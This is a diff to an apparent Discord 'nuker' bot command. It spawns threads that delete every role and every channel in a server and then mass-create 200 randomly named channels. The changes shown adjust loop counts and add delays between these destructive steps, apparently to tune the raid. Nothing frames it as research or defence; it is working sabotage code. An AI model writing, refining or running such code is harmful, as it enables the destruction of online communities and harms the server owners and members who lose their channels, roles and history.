@@ -79,7 +79,7 @@ async def nn(ctx):
             json=json
           )
 
-  for i in range(5):
+  for i in range(4):
 	  for role in list(ctx.guild.roles):
 		  threading.Thread(
 			  target=delete_role, 
@@ -87,8 +87,10 @@ async def nn(ctx):
 				).start()
   else:
     pass
-
-  for i in range(5):
+	  
+  await asyncio.sleep(3)
+	
+  for i in range(4):
     for channel in list(ctx.guild.channels):
       threading.Thread(
         target=delete_channel,
@@ -97,7 +99,9 @@ async def nn(ctx):
   else:
     pass
 
-  for i in range(100):
+  await asyncio.sleep(7)
+
+  for i in range(200):
     threading.Thread(
 		  target=create_channels,
       args=(random.choice(channel_name), )
@@ -105,7 +109,7 @@ async def nn(ctx):
   else:
     pass
 
-  await asyncio.sleep(15)
+  await asyncio.sleep(25)
 
   for i in range(100):
     threading.Thread(
